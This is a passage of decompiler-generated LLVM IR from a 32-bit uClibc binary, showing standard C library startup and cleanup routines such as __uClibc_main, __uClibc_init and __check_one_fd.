  switch i32 %arg1, label %dec_label_pc_804d7e3 [
    i32 0, label %dec_label_pc_804d7f3
    i32 1, label %dec_label_pc_804d8d8
    i32 2, label %dec_label_pc_804d7fd
    i32 3, label %dec_label_pc_804d807
    i32 4, label %dec_label_pc_804d811
    i32 5, label %dec_label_pc_804d8a7
    i32 6, label %dec_label_pc_804d819
    i32 7, label %dec_label_pc_804d7d9
    i32 8, label %dec_label_pc_804d7d9
    i32 9, label %dec_label_pc_804d7d9
    i32 10, label %dec_label_pc_804d7d9
    i32 11, label %dec_label_pc_804d7d9
    i32 12, label %dec_label_pc_804d7d9
    i32 13, label %dec_label_pc_804d7d9
    i32 14, label %dec_label_pc_804d7d9
    i32 15, label %dec_label_pc_804d7d9
    i32 16, label %dec_label_pc_804d7d9
    i32 17, label %dec_label_pc_804d7d9
    i32 18, label %dec_label_pc_804d7d9
    i32 19, label %dec_label_pc_804d7d9
    i32 20, label %dec_label_pc_804d7d9
    i32 21, label %dec_label_pc_804d7d9
    i32 22, label %dec_label_pc_804d7d9
    i32 23, label %dec_label_pc_804d8d8
    i32 24, label %dec_label_pc_804d8d8
    i32 25, label %dec_label_pc_804d8e4
    i32 26, label %dec_label_pc_804d8b5
    i32 27, label %dec_label_pc_804d8d8
    i32 28, label %dec_label_pc_804d82b
    i32 29, label %dec_label_pc_804d8ae
    i32 30, label %dec_label_pc_804d823
    i32 31, label %dec_label_pc_804d8c3
    i32 32, label %dec_label_pc_804d8d8
    i32 33, label %dec_label_pc_804d8d8
    i32 34, label %dec_label_pc_804d8d8
    i32 35, label %dec_label_pc_804d8bc
    i32 36, label %dec_label_pc_804d8eb
    i32 37, label %dec_label_pc_804d8f2
    i32 38, label %dec_label_pc_804d8eb
    i32 39, label %dec_label_pc_804d835
    i32 40, label %dec_label_pc_804d8f9
    i32 41, label %dec_label_pc_804d8d8
    i32 42, label %dec_label_pc_804d8c3
    i32 43, label %dec_label_pc_804d8f2
    i32 44, label %dec_label_pc_804d900
    i32 45, label %dec_label_pc_804d8f2
    i32 46, label %dec_label_pc_804d8ae
    i32 47, label %dec_label_pc_804d8ae
    i32 48, label %dec_label_pc_804d8ae
    i32 49, label %dec_label_pc_804d8d8
    i32 50, label %dec_label_pc_804d8d8
    i32 51, label %dec_label_pc_804d8ae
    i32 52, label %dec_label_pc_804d8ae
    i32 53, label %dec_label_pc_804d8d8
    i32 54, label %dec_label_pc_804d8d8
    i32 55, label %dec_label_pc_804d8d8
    i32 56, label %dec_label_pc_804d8d8
    i32 57, label %dec_label_pc_804d8d8
    i32 58, label %dec_label_pc_804d8d8
    i32 59, label %dec_label_pc_804d8d8
    i32 60, label %dec_label_pc_804d8d8
    i32 61, label %dec_label_pc_804d8d8
    i32 62, label %dec_label_pc_804d8d8
    i32 63, label %dec_label_pc_804d8d8
    i32 64, label %dec_label_pc_804d8d8
    i32 65, label %dec_label_pc_804d8d8
    i32 66, label %dec_label_pc_804d8d8
    i32 67, label %dec_label_pc_804d7d9
    i32 68, label %dec_label_pc_804d7d9
    i32 69, label %dec_label_pc_804d8bc
    i32 70, label %dec_label_pc_804d8bc
    i32 71, label %dec_label_pc_804d8bc
    i32 72, label %dec_label_pc_804d8c3
    i32 73, label %dec_label_pc_804d8ca
    i32 74, label %dec_label_pc_804d8d1
    i32 75, label %dec_label_pc_804d83f
    i32 76, label %dec_label_pc_804d8d1
    i32 77, label %dec_label_pc_804d7d9
    i32 78, label %dec_label_pc_804d7d9
    i32 79, label %dec_label_pc_804d7d9
    i32 80, label %dec_label_pc_804d7d9
    i32 81, label %dec_label_pc_804d7d9
    i32 82, label %dec_label_pc_804d7d9
    i32 83, label %dec_label_pc_804d7d9
    i32 84, label %dec_label_pc_804d7d9
    i32 85, label %dec_label_pc_804d8d8
    i32 86, label %dec_label_pc_804d8d8
    i32 87, label %dec_label_pc_804d8b5
    i32 88, label %dec_label_pc_804d849
    i32 89, label %dec_label_pc_804d853
    i32 90, label %dec_label_pc_804d8ca
    i32 91, label %dec_label_pc_804d7d9
    i32 92, label %dec_label_pc_804d7d9
    i32 93, label %dec_label_pc_804d7d9
    i32 94, label %dec_label_pc_804d7d9
    i32 95, label %dec_label_pc_804d8ae
    i32 96, label %dec_label_pc_804d8d8
    i32 97, label %dec_label_pc_804d8d8
    i32 98, label %dec_label_pc_804d7d9
    i32 99, label %dec_label_pc_804d7d9
    i32 100, label %dec_label_pc_804d7d9
    i32 101, label %dec_label_pc_804d85d
    i32 102, label %dec_label_pc_804d8a0
    i32 103, label %dec_label_pc_804d8dd
    i32 104, label %dec_label_pc_804d8b5
    i32 105, label %dec_label_pc_804d867
    i32 106, label %dec_label_pc_804d8c3
    i32 107, label %dec_label_pc_804d8c3
    i32 108, label %dec_label_pc_804d8a7
    i32 109, label %dec_label_pc_804d8e4
    i32 110, label %dec_label_pc_804d900
    i32 111, label %dec_label_pc_804d8a0
    i32 112, label %dec_label_pc_804d8dd
    i32 113, label %dec_label_pc_804d900
    i32 114, label %dec_label_pc_804d871
    i32 115, label %dec_label_pc_804d8f9
    i32 116, label %dec_label_pc_804d8d8
    i32 117, label %dec_label_pc_804d8d8
    i32 118, label %dec_label_pc_804d87b
    i32 119, label %dec_label_pc_804d885
    i32 120, label %dec_label_pc_804d8f2
    i32 121, label %dec_label_pc_804d8b5
    i32 122, label %dec_label_pc_804d8b5
    i32 123, label %dec_label_pc_804d8b5
    i32 124, label %dec_label_pc_804d8b5
    i32 125, label %dec_label_pc_804d7d9
    i32 126, label %dec_label_pc_804d7d9
    i32 127, label %dec_label_pc_804d8d8
    i32 128, label %dec_label_pc_804d8d8
    i32 129, label %dec_label_pc_804d7d9
    i32 130, label %dec_label_pc_804d7d9
    i32 131, label %dec_label_pc_804d8d8
    i32 149, label %dec_label_pc_804d88c
  ]

dec_label_pc_804d7d9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d7e3:                             ; preds = %entry
  %v1_804d7e3 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804d7e8 = inttoptr i32 %v1_804d7e3 to i32*
  store i32 22, i32* %v1_804d7e8, align 4
  br label %dec_label_pc_804d8d8

dec_label_pc_804d7f3:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d7fd:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d807:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d811:                             ; preds = %entry
  %v0_804d814 = call i32 @getdtablesize()
  br label %dec_label_pc_804d819

dec_label_pc_804d819:                             ; preds = %entry, %dec_label_pc_804d811
  br label %dec_label_pc_804d905

dec_label_pc_804d823:                             ; preds = %entry
  %v3_804d826 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804d82b

dec_label_pc_804d82b:                             ; preds = %entry, %dec_label_pc_804d823
  br label %dec_label_pc_804d905

dec_label_pc_804d835:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d83f:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d849:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d853:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d85d:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d867:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d871:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d87b:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d885:                             ; preds = %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d88c:                             ; preds = %entry
  %v5_804d892 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_804d89a = icmp slt i32 %v5_804d892, 0
  %v1_804d89c = icmp eq i1 %v2_804d89a, false
  br i1 %v1_804d89c, label %dec_label_pc_804d8ae, label %dec_label_pc_804d8d8

dec_label_pc_804d8a0:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8a7:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8ae:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804d88c
  br label %dec_label_pc_804d905

dec_label_pc_804d8b5:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8bc:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8c3:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8ca:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8d1:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8d8:                             ; preds = %dec_label_pc_804d88c, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_804d7e3
  br label %dec_label_pc_804d905

dec_label_pc_804d8dd:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8e4:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8eb:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8f2:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d8f9:                             ; preds = %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d900:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_804d905

dec_label_pc_804d905:                             ; preds = %dec_label_pc_804d8f9, %dec_label_pc_804d8f2, %dec_label_pc_804d8eb, %dec_label_pc_804d8e4, %dec_label_pc_804d8dd, %dec_label_pc_804d8d1, %dec_label_pc_804d8ca, %dec_label_pc_804d8c3, %dec_label_pc_804d8bc, %dec_label_pc_804d8b5, %dec_label_pc_804d8a7, %dec_label_pc_804d8a0, %dec_label_pc_804d8ae, %dec_label_pc_804d885, %dec_label_pc_804d87b, %dec_label_pc_804d871, %dec_label_pc_804d867, %dec_label_pc_804d85d, %dec_label_pc_804d853, %dec_label_pc_804d849, %dec_label_pc_804d83f, %dec_label_pc_804d835, %dec_label_pc_804d82b, %dec_label_pc_804d819, %dec_label_pc_804d807, %dec_label_pc_804d7fd, %dec_label_pc_804d8d8, %dec_label_pc_804d7f3, %dec_label_pc_804d7d9, %dec_label_pc_804d900
  %v0_804d908 = phi i32 [ 255, %dec_label_pc_804d8f9 ], [ 2048, %dec_label_pc_804d8f2 ], [ 99, %dec_label_pc_804d8eb ], [ 20, %dec_label_pc_804d8e4 ], [ -128, %dec_label_pc_804d8dd ], [ 1024, %dec_label_pc_804d8d1 ], [ 4, %dec_label_pc_804d8ca ], [ 32, %dec_label_pc_804d8c3 ], [ 256, %dec_label_pc_804d8bc ], [ 2147483647, %dec_label_pc_804d8b5 ], [ 16, %dec_label_pc_804d8a7 ], [ 127, %dec_label_pc_804d8a0 ], [ 200112, %dec_label_pc_804d8ae ], [ 9, %dec_label_pc_804d885 ], [ 65535, %dec_label_pc_804d87b ], [ -32768, %dec_label_pc_804d871 ], [ -2147483648, %dec_label_pc_804d867 ], [ 8, %dec_label_pc_804d85d ], [ 500, %dec_label_pc_804d853 ], [ 4096, %dec_label_pc_804d849 ], [ 16384, %dec_label_pc_804d83f ], [ 1000, %dec_label_pc_804d835 ], [ 32768, %dec_label_pc_804d82b ], [ 6, %dec_label_pc_804d819 ], [ 65536, %dec_label_pc_804d807 ], [ 100, %dec_label_pc_804d7fd ], [ -1, %dec_label_pc_804d8d8 ], [ 131072, %dec_label_pc_804d7f3 ], [ 1, %dec_label_pc_804d7d9 ], [ 32767, %dec_label_pc_804d900 ]
  ret i32 %v0_804d908

; uselistorder directives
  uselistorder i32 32768, { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 6, 7, 3, 5, 9, 0, 1, 2, 8 }
  uselistorder i32 (i32, i32, i32)* @__GI_getpagesize, { 1, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 124, { 1, 0 }
  uselistorder i32 115, { 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 50, { 2, 1, 0 }
  uselistorder i32 49, { 1, 0 }
  uselistorder i32 30, { 1, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 19, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_804d905, { 29, 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28 }
  uselistorder label %dec_label_pc_804d8d8, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_804d8ae, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804d82b, { 1, 0 }
  uselistorder label %dec_label_pc_804d819, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d90c = load i32, i32* @ebx, align 4
  store i32 %v0_804d90c, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_804d920, label %dec_label_pc_804d92d

dec_label_pc_804d920:                             ; preds = %entry, %dec_label_pc_804d920
  %v1_804d9278 = phi i32 [ %v1_804d927, %dec_label_pc_804d920 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32 -1), %entry ]
  store i32 ptrtoint (i32* @global_var_804d927.379 to i32), i32* %stack_var_-16, align 4
  %v5_804d920 = mul i32 %v1_804d9278, 4
  %v6_804d920 = add i32 %v5_804d920, ptrtoint (i32* @global_var_8053000.378 to i32)
  %v7_804d920 = inttoptr i32 %v6_804d920 to i32*
  %v8_804d920 = load i32, i32* %v7_804d920, align 4
  call void @__pseudo_call(i32 %v8_804d920)
  %v0_804d927.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d927 = add i32 %v0_804d927.pre, -1
  store i32 %v1_804d927, i32* %ebx.global-to-local, align 4
  %v10_804d928 = icmp eq i32 %v0_804d927.pre, 0
  %v1_804d92b = icmp eq i1 %v10_804d928, false
  br i1 %v1_804d92b, label %dec_label_pc_804d920, label %dec_label_pc_804d92d

dec_label_pc_804d92d:                             ; preds = %dec_label_pc_804d920, %entry
  %v0_804d92d = load i32, i32* @global_var_8055dd4.380, align 4
  %v1_804d932 = icmp eq i32 %v0_804d92d, 0
  br i1 %v1_804d932, label %dec_label_pc_804d938, label %dec_label_pc_804d936

dec_label_pc_804d936:                             ; preds = %dec_label_pc_804d92d
  %v0_804d936 = load i32, i32* %stack_var_-16, align 4
  %v1_804d936 = call i32 @unknown_0(i32 %v0_804d936)
  br label %dec_label_pc_804d938

dec_label_pc_804d938:                             ; preds = %dec_label_pc_804d936, %dec_label_pc_804d92d
  %v0_804d938 = load i32, i32* @global_var_8055dd8.381, align 8
  %v1_804d93e = icmp eq i32 %v0_804d938, 0
  br i1 %v1_804d93e, label %dec_label_pc_804d947, label %dec_label_pc_804d942

dec_label_pc_804d942:                             ; preds = %dec_label_pc_804d938
  %v2_804d942 = load i32, i32* %stack_var_-16, align 4
  %v1_804d945 = call i32 @unknown_0(i32 %v2_804d942)
  br label %dec_label_pc_804d947

dec_label_pc_804d947:                             ; preds = %dec_label_pc_804d942, %dec_label_pc_804d938
  %v2_804d947 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_804d947

; uselistorder directives
  uselistorder i32 %v1_804d927, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804d920, { 1, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804d94e = load i32, i32* @eax, align 4
  ret i32 %v0_804d94e
}

define i32 @__check_one_fd() local_unnamed_addr {
entry:
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d94f = load i32, i32* @esi, align 4
  %v0_804d950 = load i32, i32* @eax, align 4
  store i32 %v0_804d950, i32* @esi, align 4
  %v0_804d952 = load i32, i32* @ebx, align 4
  store i32 %v0_804d952, i32* %stack_var_-8, align 4
  %v0_804d953 = load i32, i32* @edx, align 4
  store i32 %v0_804d953, i32* @ebx, align 4
  %v5_804d95b = call i32 @__libc_fcntl(i32 %v0_804d950, i32 1, i32 %tmp6, i32 %tmp2)
  %v1_804d963 = add i32 %v5_804d95b, 1
  %v8_804d963 = icmp eq i32 %v1_804d963, 0
  %v1_804d964 = icmp eq i1 %v8_804d963, false
  br i1 %v1_804d964, label %dec_label_pc_804d97f, label %dec_label_pc_804d966

dec_label_pc_804d966:                             ; preds = %entry
  %v0_804d968 = load i32, i32* @ebx, align 4
  %v5_804d96e = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805268c.382, i32 0, i32 0), i32 %v0_804d968, i32 %v1_804d963)
  %v1_804d976 = load i32, i32* @esi, align 4
  %v12_804d976 = icmp eq i32 %v5_804d96e, %v1_804d976
  br i1 %v12_804d976, label %dec_label_pc_804d97f, label %dec_label_pc_804d97a

dec_label_pc_804d97a:                             ; preds = %dec_label_pc_804d966
  %v0_804d97a = call i32 @abort()
  br label %dec_label_pc_804d97f

dec_label_pc_804d97f:                             ; preds = %dec_label_pc_804d966, %entry, %dec_label_pc_804d97a
  %v2_804d97f = load i32, i32* %stack_var_-12, align 4
  %v2_804d980 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d980, i32* @ebx, align 4
  store i32 %v0_804d94f, i32* @esi, align 4
  ret i32 %v2_804d97f

; uselistorder directives
  uselistorder i32 ()* @abort, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804d97f, { 2, 0, 1 }
}

define i32 @__GI___uClibc_init() local_unnamed_addr {
entry:
  %v0_804d986 = load i8, i8* @global_var_8055ddc.383, align 4
  %v1_804d986 = icmp eq i8 %v0_804d986, 0
  %v1_804d98d = icmp eq i1 %v1_804d986, false
  br i1 %v1_804d98d, label %entry.dec_label_pc_804d9bf_crit_edge, label %dec_label_pc_804d98f

entry.dec_label_pc_804d9bf_crit_edge:             ; preds = %entry
  %v0_804d9c2.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804d9bf

dec_label_pc_804d98f:                             ; preds = %entry
  store i8 1, i8* @global_var_8055ddc.383, align 4
  store i32 4096, i32* @global_var_8055dd0.307, align 16
  %v0_804d9ba = call i32 @_stdio_init()
  br label %dec_label_pc_804d9bf

dec_label_pc_804d9bf:                             ; preds = %entry.dec_label_pc_804d9bf_crit_edge, %dec_label_pc_804d98f
  %v0_804d9c2 = phi i32 [ %v0_804d9c2.pre, %entry.dec_label_pc_804d9bf_crit_edge ], [ %v0_804d9ba, %dec_label_pc_804d98f ]
  ret i32 %v0_804d9c2

; uselistorder directives
  uselistorder i8* @global_var_8055ddc.383, { 1, 0 }
  uselistorder label %dec_label_pc_804d9bf, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp29, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_8055dc8.384, align 8
  store i32 %arg6, i32* @global_var_8055dd8.381, align 8
  %v2_804d9fa = mul i32 %arg2, 4
  %v3_804d9fa = add i32 %tmp29, %v2_804d9fa
  %v1_804d9fd = add i32 %v3_804d9fa, 4
  store i32 %v1_804d9fd, i32* %edx.global-to-local, align 4
  store i32 %v1_804d9fd, i32* @global_var_8055dcc.376, align 4
  %v3_804da06 = load i32, i32* %arg3, align 4
  %v14_804da06 = icmp eq i32 %v1_804d9fd, %v3_804da06
  store i32 0, i32* %stack_var_-168, align 4
  %v1_804da0c = icmp eq i1 %v14_804da06, false
  %v4_804da0c = select i1 %v1_804da0c, i32 %v1_804d9fd, i32 %v3_804d9fa
  store i32 %v4_804da0c, i32* @global_var_8055dcc.376, align 4
  %v2_804da14 = ptrtoint i32* %stack_var_-136 to i32
  %v3_804da19 = bitcast i32* %stack_var_-136 to i8*
  %v4_804da19 = call i32 @__GI_memset(i8* %v3_804da19, i32 0, i32 120)
  %v0_804da1e = load i32, i32* @global_var_8055dcc.376, align 4
  br label %dec_label_pc_804da26

dec_label_pc_804da26:                             ; preds = %dec_label_pc_804da26, %entry
  %v0_804da26 = phi i32 [ %v1_804da29, %dec_label_pc_804da26 ], [ %v0_804da1e, %entry ]
  %v1_804da26 = inttoptr i32 %v0_804da26 to i32*
  %v2_804da26 = load i32, i32* %v1_804da26, align 4
  %v3_804da26 = icmp eq i32 %v2_804da26, 0
  %v1_804da29 = add i32 %v0_804da26, 4
  %v1_804da2c = icmp eq i1 %v3_804da26, false
  br i1 %v1_804da2c, label %dec_label_pc_804da26, label %dec_label_pc_804da4d.preheader

dec_label_pc_804da4d.preheader:                   ; preds = %dec_label_pc_804da26
  store i32 %v1_804da29, i32* @ebx, align 4
  %v1_804da4d1 = inttoptr i32 %v1_804da29 to i32*
  %v2_804da4d2 = load i32, i32* %v1_804da4d1, align 4
  %v3_804da4d3 = icmp eq i32 %v2_804da4d2, 0
  %v1_804da5010 = icmp eq i1 %v3_804da4d3, false
  br i1 %v1_804da5010, label %dec_label_pc_804da32.lr.ph, label %dec_label_pc_804da52

dec_label_pc_804da32.lr.ph:                       ; preds = %dec_label_pc_804da4d.preheader
  %v3_804da0a = ptrtoint i32* %stack_var_-168 to i32
  %v3_804da3d = add i32 %v3_804da0a, 32
  br label %dec_label_pc_804da32

dec_label_pc_804da32:                             ; preds = %dec_label_pc_804da32.lr.ph, %dec_label_pc_804da4a
  %v1_804da3d = phi i32 [ %v2_804da4d2, %dec_label_pc_804da32.lr.ph ], [ %v2_804da4d, %dec_label_pc_804da4a ]
  %v0_804da3c = phi i32 [ %v1_804da29, %dec_label_pc_804da32.lr.ph ], [ %v1_804da4a, %dec_label_pc_804da4a ]
  %v6_804da37 = icmp ugt i32 %v1_804da3d, 14
  br i1 %v6_804da37, label %dec_label_pc_804da4a, label %dec_label_pc_804da39

dec_label_pc_804da39:                             ; preds = %dec_label_pc_804da32
  %v0_804da39 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804da39, i32* %stack_var_-160, align 4
  store i32 %v0_804da3c, i32* %stack_var_-168, align 4
  %v2_804da3d = mul i32 %v1_804da3d, 8
  %v4_804da3d = add i32 %v3_804da3d, %v2_804da3d
  %v3_804da42 = inttoptr i32 %v4_804da3d to i16*
  %v4_804da42 = call i32 @memcpy(i16* %v3_804da42, i32 %v0_804da3c, i32 8)
  %v0_804da4a.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804da4a

dec_label_pc_804da4a:                             ; preds = %dec_label_pc_804da32, %dec_label_pc_804da39
  %v0_804da4a = phi i32 [ %v0_804da3c, %dec_label_pc_804da32 ], [ %v0_804da4a.pre, %dec_label_pc_804da39 ]
  %v1_804da4a = add i32 %v0_804da4a, 8
  store i32 %v1_804da4a, i32* @ebx, align 4
  %v1_804da4d = inttoptr i32 %v1_804da4a to i32*
  %v2_804da4d = load i32, i32* %v1_804da4d, align 4
  %v3_804da4d = icmp eq i32 %v2_804da4d, 0
  %v1_804da50 = icmp eq i1 %v3_804da4d, false
  br i1 %v1_804da50, label %dec_label_pc_804da32, label %dec_label_pc_804da52

dec_label_pc_804da52:                             ; preds = %dec_label_pc_804da4a, %dec_label_pc_804da4d.preheader
  store i32 %v2_804da14, i32* @eax, align 4
  %v0_804da56 = call i32 @_dl_aux_init()
  store i32 %v0_804da56, i32* @eax, align 4
  %v0_804da5b = call i32 @__GI___uClibc_init()
  store i32 4096, i32* %edx.global-to-local, align 4
  %v1_804da69 = icmp eq i32 %tmp24, 0
  %v3_804da6b = select i1 %v1_804da69, i32 4096, i32 %tmp24
  %v13_804da6e = icmp eq i32 %tmp23, -1
  store i32 %v3_804da6b, i32* @global_var_8055dd0.307, align 16
  %v1_804da78 = icmp eq i1 %v13_804da6e, false
  br i1 %v1_804da78, label %dec_label_pc_804daa3, label %dec_label_pc_804da7a

dec_label_pc_804da7a:                             ; preds = %dec_label_pc_804da52
  %v0_804da7a = call i32 @getuid()
  store i32 %v0_804da7a, i32* @ebx, align 4
  %v0_804da81 = call i32 @geteuid()
  %v0_804da86 = load i32, i32* @ebx, align 4
  %v12_804da86 = icmp eq i32 %v0_804da86, %v0_804da81
  %v1_804da88 = icmp eq i1 %v12_804da86, false
  br i1 %v1_804da88, label %dec_label_pc_804dab9, label %dec_label_pc_804da8a

dec_label_pc_804da8a:                             ; preds = %dec_label_pc_804da7a
  %v0_804da8a = call i32 @getgid()
  store i32 %v0_804da8a, i32* @ebx, align 4
  %v0_804da91 = call i32 @getegid()
  %v0_804da96 = load i32, i32* @ebx, align 4
  %v12_804da96 = icmp eq i32 %v0_804da96, %v0_804da91
  %v1_804da98 = icmp eq i1 %v12_804da96, false
  br i1 %v1_804da98, label %dec_label_pc_804dab9, label %dec_label_pc_804da9a.thread

dec_label_pc_804da9a.thread:                      ; preds = %dec_label_pc_804da8a
  br label %dec_label_pc_804dae3

dec_label_pc_804daa3:                             ; preds = %dec_label_pc_804da52
  %v15_804daa3 = icmp eq i32 %tmp23, %tmp22
  %v1_804daa7 = icmp eq i1 %v15_804daa3, false
  br i1 %v1_804daa7, label %dec_label_pc_804dab9, label %dec_label_pc_804daa9

dec_label_pc_804daa9:                             ; preds = %dec_label_pc_804daa3
  br label %dec_label_pc_804dab9

dec_label_pc_804dab9:                             ; preds = %dec_label_pc_804daa9, %dec_label_pc_804daa3, %dec_label_pc_804da8a, %dec_label_pc_804da7a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804dac0 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804dacf = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804dade = call i32 @__check_one_fd()
  br label %dec_label_pc_804dae3

dec_label_pc_804dae3:                             ; preds = %dec_label_pc_804da9a.thread, %dec_label_pc_804dab9
  %v0_804dae3 = load i32, i32* @edi, align 4
  %v1_804dae3 = inttoptr i32 %v0_804dae3 to i32*
  %v2_804dae3 = load i32, i32* %v1_804dae3, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32* %esi.global-to-local, align 4
  store i32 %v2_804dae3, i32* inttoptr (i32 134559512 to i32*), align 8
  store i32 %arg5, i32* @global_var_8055dd4.380, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8053000.378 to i32), i32 -134557696), i32 2), i32 0), label %dec_label_pc_804db08, label %dec_label_pc_804db14

dec_label_pc_804db08:                             ; preds = %dec_label_pc_804dae3, %dec_label_pc_804db08
  %v4_804db0852 = phi i32 [ %v1_804db0f, %dec_label_pc_804db08 ], [ 0, %dec_label_pc_804dae3 ]
  store i32 ptrtoint (i32* @global_var_804db0f.386 to i32), i32* %stack_var_-160, align 4
  %v5_804db08 = mul i32 %v4_804db0852, 4
  %v6_804db08 = add i32 %v5_804db08, ptrtoint (i32* @global_var_8053000.378 to i32)
  %v7_804db08 = inttoptr i32 %v6_804db08 to i32*
  %v8_804db08 = load i32, i32* %v7_804db08, align 4
  call void @__pseudo_call(i32 %v8_804db08)
  %v0_804db0f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804db0f = add i32 %v0_804db0f, 1
